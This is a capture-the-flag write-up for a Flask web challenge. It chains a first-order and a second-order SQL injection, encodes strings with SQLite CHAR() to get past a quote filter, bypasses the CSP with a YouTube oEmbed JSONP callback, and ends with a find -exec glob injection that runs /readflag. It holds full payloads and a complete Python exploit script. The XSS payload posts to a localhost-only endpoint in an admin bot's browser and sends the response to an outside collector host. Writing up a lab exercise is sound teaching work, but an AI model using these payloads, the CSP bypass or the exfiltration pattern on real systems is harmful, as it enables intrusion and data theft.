# Smol web - Double SQL Injection → CSP Bypass XSS → RCE

## Initial Recon

We've got a Flask app with a product rating system. The interesting endpoints are:
- `/ratings` - displays products filtered by quantity parameter
- `/report` - admin bot visits URLs (SSRF vector)
- `/finder` + `/search` - localhost-only file search with command injection

The goal is chaining vulnerabilities to get RCE through the restricted endpoints.

## Vulnerability #1: First-Order SQL Injection

The `/ratings` endpoint has a classic SQLi:
```python
quantity = request.args.get("quantity", "") or '9'
if any(c in quantity for c in ("'", '"', "\\")):
   quantity = 7
   flash("Warning: Suspicious characters detected...")
   
sql = f"SELECT id, name, description, user_id FROM products WHERE quantity = {quantity}"
```

The filter blocks quotes, double quotes, and backslashes. But we're in a numeric context, so we don't need them - we can inject directly with `UNION`.

Testing: 
```
/ratings?quantity=8 UNION SELECT 1,2,3,4
```

This works. The query returns columns: `id, name, description, user_id`.

## Vulnerability #2: Second-Order SQL Injection

Here's where it gets interesting. Look at what happens after the first query executes:
```python
rows = db.execute(sql).fetchall()

for r in rows:
    user_name = "(unknown user)"
    try:
        # SECOND QUERY - UNSANITIZED!
        user_q = f"SELECT id, name FROM users WHERE id = {r['user_id']}"
        user_row = db.execute(user_q).fetchone()
        user_name = user_row['name'] if user_row else "(unknown user)"
    except Exception:
        user_name = "(Error)"
```

The code takes the `user_id` from our injected row and directly interpolates it into a **second SQL query** without any sanitization. This is a second-order SQL injection.

### Exploiting the Double Injection

**First injection** - we control what goes into `user_id`:
```sql
8 UNION SELECT 1, 1, 1, <PAYLOAD_HERE>
```

**Second injection** - our payload gets executed:
```sql
SELECT id, name FROM users WHERE id = <PAYLOAD_HERE>
```

We can inject another `UNION SELECT` to control what appears as the `user_name`:
```sql
10 UNION SELECT 1, '<XSS_PAYLOAD>'
```

The `10` ensures the WHERE clause fails (no user with ID 10), then our UNION returns our controlled data as the "name".

### The Quote Problem

But wait - we need quotes for the XSS string, and they're filtered in the first injection!

**Solution**: Use SQLite's `CHAR()` function with concatenation:
```sql
CHAR(60)||CHAR(115)||CHAR(99)...  -- builds '<script>...'
```

So our full payload structure:
1. First SQLi injects the CHAR-encoded second payload
2. Second SQLi decodes and returns our XSS as the username
3. XSS gets rendered in the page

## Vulnerability #3: CSP Bypass via YouTube JSONP

The app has a strict CSP:
```python
"script-src 'self' https://cdn.tailwindcss.com https://www.youtube.com; "
```

No `unsafe-inline`, no `unsafe-eval`, but **youtube.com is whitelisted**.

YouTube's oEmbed API has a legacy JSONP endpoint with a `callback` parameter:
```
https://www.youtube.com/oembed?callback=<ARBITRARY_JS>
```

When you load this in a script tag:
```html
<script src="https://www.youtube.com/oembed?callback=alert(1);"></script>
```

YouTube returns: `alert(1);({...json...})` which executes our JavaScript!

This bypasses CSP because:
1. Script is loaded from whitelisted domain (youtube.com)
2. The callback parameter lets us inject arbitrary code
3. The code executes in the page context with full privileges

### Crafting the XSS

Our JavaScript payload needs to:
1. Access the `/search` endpoint (localhost-only, but XSS runs in admin's browser)
2. Submit the command injection payload
3. Exfiltrate the response
```javascript
fetch('/search', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'search=-exec+/*e*g*+{}+;'
}).then(function(r){
  return Response.prototype.text.call(r);
}).then(function(t){
  location='http://hov3j8mv.requestrepo.com/?text='+encodeURIComponent(t);
});
```

URL-encode this entire JavaScript, then wrap it:
```html
<script src="https://www.youtube.com/oembed?callback=<URL_ENCODED_JS>"></script>
```

## Putting It All Together: The Double SQLi Chain

Let's trace through the complete injection:

### Step 1: Build the XSS payload
```html
<script src="https://www.youtube.com/oembed?callback=fetch(...)"></script>
```

### Step 2: Build the second-order SQLi
This payload will be executed in the second query:
```sql
10 UNION SELECT 1, '<script src="https://www.youtube.com/oembed?callback=..."></script>'
```

### Step 3: Encode with CHAR() to bypass quote filter
```python
def convert_to_char(payload):
    new = ""
    for c in payload:
        new += f"CHAR({str(ord(c))})||"
    new = new[:len(new)-2]
    return new
```

Example: `<script>` becomes:
```sql
CHAR(60)||CHAR(115)||CHAR(99)||CHAR(114)||CHAR(105)||CHAR(112)||CHAR(116)||CHAR(62)
```

### Step 4: Build the first SQLi
```sql
8 UNION SELECT 1, 1, 1, CHAR(49)||CHAR(48)||CHAR(32)||...
```

Where the CHAR sequence decodes to our second SQLi payload from Step 2.

### The Full URL
```
http://target:5000/ratings?quantity=8+UNION+SELECT+1,1,1,CHAR(49)||CHAR(48)||CHAR(32)||CHAR(85)||...
```

## Vulnerability #4: Command Injection in `/search`

The `/search` endpoint is only accessible by local users (such as the bot) and it this endpoint is filters heavily:
```python
def sanitize_input(payload):
    if payload is None:
        return ""
    s = str(payload)
    cmds = ['cc', 'gcc ', 'ex ', 'sleep ']

    if re.search(r"""[<>mhnpdvq$srl+%kowatf123456789'^@"\\]""", s):
        return "Character Not Allowed"
    if any(cmd in s for cmd in cmds):
        return "Command Not Allowed"
    pattern = re.compile(r'([;&|$\(\)\[\]<>])')
    escaped = pattern.sub(r'\\\1', s)
    return escaped
```

Blocks: digits, quotes, dollar signs, `h,n,p,d,v,q,s,r,l`, etc.

But allows: `e,x,c,g,a,b,i,j,k,u,w,y,z`, while some other specials caracter being escape.

The command is:
```python
cmd = f"find {FILES_DIR} {sanitized_payload}"
subprocess.run(cmd, shell=True, ...)
```

### The Exploit

We can use `find`'s `-exec` flag:
```bash
find ./uploads -exec COMMAND {} ;
```

The payload:
```
search=-exec+/*e*g*+{}+;
```

In the actual command becomes:
```bash
find ./uploads -exec /*e*g* {} ;
```

The wildcard `/*e*g*` matches the `/readflag` binary:
- `/r-e-a-d-f-l-a-g` matches the pattern `/*e*g*`
- The `*` wildcards match any characters between
- Shell glob expansion resolves this to `/readflag`

So our command effectively becomes:
```bash
find ./uploads -exec /readflag {} ;
```

This executes the `/readflag` binary which outputs the real flag.



## Final script

So this script will execute **double sqli** -> **xss with csp jsonp bypass** -> **argument injection bypass** through the local search endpoint.

```python
import requests
import urllib

URL = "http://172.18.0.2:5000"
s = requests.Session()

def convert_to_char(payload):
    new = ""
    for c in payload:
        new += f"CHAR({str(ord(c))})||"
    new = new[:len(new)-2]
    #new += ")"
    return new

def sqli_to_xss():
    js="fetch('/search',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'search=-exec+/*e*g*+{}+;'}).then(function(r){return Response.prototype.text.call(r);}).then(function(t){location='http://hov3j8mv.requestrepo.com/?text='+encodeURIComponent(t);});"

    esc = urllib.parse.quote(js)
    xss_payload = f'<script src="https://www.youtube.com/oembed?callback={esc}"></script>'

    second_sqli = f"10 UNION SELECT 1,'{xss_payload}'"

    url_payload = URL + "/ratings?quantity=8+UNION+SELECT+1,1,1," + convert_to_char(second_sqli)
    print(url_payload)


sqli_to_xss()
```

Next you can send the url printed by the script to the bot to get the flag.